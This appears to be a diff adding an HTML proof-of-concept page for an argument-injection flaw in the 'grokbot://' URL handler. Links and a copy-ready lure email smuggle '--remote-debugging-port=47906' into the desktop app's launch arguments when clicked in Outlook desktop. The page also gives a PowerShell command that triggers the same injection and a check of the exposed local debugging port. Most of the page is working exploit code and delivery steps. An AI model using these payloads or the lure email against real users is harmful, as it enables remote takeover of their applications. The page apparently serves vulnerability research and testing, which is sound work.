@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Grok Bot Email Delivery Test</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#e0e0e0;padding:20px}
+.container{max-width:800px;margin:0 auto}
+h1{color:#ff4444;margin-bottom:20px}
+.card{background:#14141f;border:1px solid #222;border-radius:8px;padding:20px;margin-bottom:20px}
+.card h2{color:#6cf;margin-bottom:12px}
+code{background:#1a1a2e;padding:2px 6px;border-radius:3px;font-family:monospace;color:#ff8866;word-break:break-all}
+pre{background:#1a1a2e;padding:16px;border-radius:6px;overflow-x:auto;font-family:monospace;font-size:0.85rem;color:#ccc;margin:8px 0}
+.warn{background:#2a1a00;border:1px solid #664400;border-radius:6px;padding:12px;margin:12px 0;color:#ffaa44}
+a.test-link{display:block;padding:16px;background:#880000;color:#fff;text-decoration:none;text-align:center;font-size:1.1rem;font-weight:700;border-radius:8px;margin:12px 0;border:2px solid #ff4444}
+a.test-link:hover{background:#aa0000}
+a.test-link.clean{background:#004488;border-color:#4488ff}
+.tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:0.75rem;font-weight:600}
+.tag.red{background:#441111;color:#ff6666;border:1px solid #662222}
+.tag.green{background:#114411;color:#66ff66;border:1px solid #226622}
+.tag.yellow{background:#443311;color:#ffcc66;border:1px solid #665522}
+</style>
+</head>
+<body>
+<div class="container">
+
+<h1>Grok Bot - Email Delivery Test</h1>
+
+<div class="card">
+<h2>The Problem</h2>
+<p>Clicking a link to this <em>webpage</em> from email opens it in a <strong>browser</strong>. Browsers block <code>"</code> in custom scheme URLs (GURL validation). So the exploit link on the page doesn't fire.</p>
+<p style="margin-top:10px">For email delivery, the <code>grokbot://</code> URL must be the <strong>direct href</strong> in the email HTML, so the email client (Outlook desktop) dispatches it via <code>ShellExecuteW</code> — bypassing the browser entirely.</p>
+</div>
+
+<div class="card">
+<h2>Test Links (click from THIS page)</h2>
+<p class="warn">These test the browser's behavior. They will likely be blocked by GURL. This page exists to verify that.</p>
+
+<h3 style="color:#aaa;margin:16px 0 8px;font-size:0.85rem">Test 1: Malicious URL with &quot; (HTML entity encoded)</h3>
+<a class="test-link" href="grokbot://x&quot; --remote-debugging-port=47906 &quot;--y=z">CLICK: grokbot:// with &amp;quot; encoding</a>
+
+<h3 style="color:#aaa;margin:16px 0 8px;font-size:0.85rem">Test 2: Malicious URL with raw quote in single-quoted href</h3>
+<a class="test-link" href='grokbot://x" --remote-debugging-port=47906 "--y=z'>CLICK: grokbot:// with raw " in href</a>
+
+<h3 style="color:#aaa;margin:16px 0 8px;font-size:0.85rem">Test 3: Clean control URL</h3>
+<a class="test-link clean" href="grokbot://app/v1/open">CLICK: Clean grokbot://app/v1/open (should work)</a>
+</div>
+
+<div class="card">
+<h2>How to Test Email Delivery</h2>
+<p>Copy the HTML below and send it as an <strong>HTML email</strong> (not plain text). Open in <strong>Outlook Desktop (classic)</strong> and click the link.</p>
+
+<h3 style="color:#aaa;margin:16px 0 8px;font-size:0.85rem">Email HTML to copy:</h3>
+<pre id="email-html">&lt;html&gt;
+&lt;body&gt;
+&lt;p&gt;Hi, check out this Grok Bot feature:&lt;/p&gt;
+
+&lt;!-- Test 1: HTML entity &amp;quot; for the quote character --&gt;
+&lt;p&gt;&lt;a href="grokbot://x&amp;quot; --remote-debugging-port=47906 &amp;quot;--y=z"&gt;
+  Open in Grok Bot (Test 1 - entity)
+&lt;/a&gt;&lt;/p&gt;
+
+&lt;!-- Test 2: Percent-encoded %22 for quote --&gt;
+&lt;p&gt;&lt;a href="grokbot://x%22 --remote-debugging-port=47906 %22--y=z"&gt;
+  Open in Grok Bot (Test 2 - %22)
+&lt;/a&gt;&lt;/p&gt;
+
+&lt;!-- Test 3: Clean link (control) --&gt;
+&lt;p&gt;&lt;a href="grokbot://app/v1/open"&gt;
+  Open Grok Bot (Test 3 - clean control)
+&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks!&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<button onclick="navigator.clipboard.writeText(document.getElementById('email-html').innerText).then(()=>this.textContent='Copied!').catch(()=>{})" style="padding:8px 16px;background:#333;color:#fff;border:1px solid #555;border-radius:4px;cursor:pointer;margin-top:8px">Copy Email HTML</button>
+</div>
+
+<div class="card">
+<h2>Expected Results</h2>
+<table style="width:100%;border-collapse:collapse">
+<tr style="border-bottom:1px solid #333"><th style="text-align:left;padding:8px;color:#6cf">Scenario</th><th style="text-align:left;padding:8px;color:#6cf">Expected</th></tr>
+<tr style="border-bottom:1px solid #222"><td style="padding:8px">Click from this webpage (browser)</td><td style="padding:8px"><span class="tag red">BLOCKED</span> GURL rejects &quot;</td></tr>
+<tr style="border-bottom:1px solid #222"><td style="padding:8px">Click &amp;quot; link in Outlook desktop</td><td style="padding:8px"><span class="tag yellow">TEST</span> Does Word engine decode &amp;quot; → " ?</td></tr>
+<tr style="border-bottom:1px solid #222"><td style="padding:8px">Click %22 link in Outlook desktop</td><td style="padding:8px"><span class="tag yellow">TEST</span> Does Outlook decode %22 → " ?</td></tr>
+<tr style="border-bottom:1px solid #222"><td style="padding:8px">Click clean link anywhere</td><td style="padding:8px"><span class="tag green">WORKS</span> Grok Bot opens normally</td></tr>
+</table>
+</div>
+
+<div class="card">
+<h2>Alternative: PowerShell Direct Test</h2>
+<p>To confirm the vulnerability works (bypassing browser/email), run in PowerShell:</p>
+<pre>Start-Process 'grokbot://x" --remote-debugging-port=47906 "--y=z'</pre>
+<p style="margin-top:8px;color:#888">Then check: <code>Invoke-WebRequest http://127.0.0.1:47906/json</code></p>
+</div>
+
+</div>
+</body>
+</html>
